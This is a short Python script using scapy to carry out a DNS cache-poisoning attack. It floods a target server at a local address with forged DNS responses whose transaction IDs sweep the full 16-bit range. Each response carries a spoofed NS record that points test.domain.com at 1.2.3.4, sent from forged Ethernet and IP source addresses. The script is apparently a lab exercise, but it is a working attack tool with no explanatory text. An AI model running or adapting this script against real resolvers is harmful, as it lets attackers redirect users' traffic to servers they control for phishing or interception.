from scapy.all import *
from scapy.layers.l2 import *
import time
import threading

SERVER_ADDR = '192.168.1.3'
NS_RECORD = "test.domain.com"
SPOOF_ADDR = '1.2.3.4'
THREAD_NUMBER = 1


def split_range (max_value, n):

	step = float (max_value) / n

	old_counter = 0
	counter = step

	while counter < max_value:
		yield (int (old_counter), int (counter) - 1)
		old_counter = counter
		counter += step

	yield (int (old_counter), max_value - 1)


def worker (start_id, end_id):

	# start = int (round (time.time () * 1000))

	pkt = Ether (src="a0:b3:cc:c9:e6:17", dst="50:46:5d:e4:b4:9d") \
		/ IP (dst=SERVER_ADDR, src="192.168.1.2") \
		/ UDP (dport=4250) \
		/ DNS (id=(start_id, end_id), an=DNSRR(
			rrname=NS_RECORD, type='NS', rclass='IN', ttl=350, rdata=SPOOF_ADDR))

	# pkg_gen = int (round (time.time () * 1000))

	# print 'Start sending'
	sendp (pkt, verbose=0)

	# finish = int (round (time.time () * 1000))

	# print 'Generation time:', (pkg_gen - start) / 1000, 's'
	# print 'Send time:', (finish - pkg_gen) / 1000, 's'

chunks = split_range (2**16, THREAD_NUMBER)
threads = []
for s, e in chunks:
	t = threading.Thread (target=worker, args=(s, e))
	threads.append (t)
	t.start ()
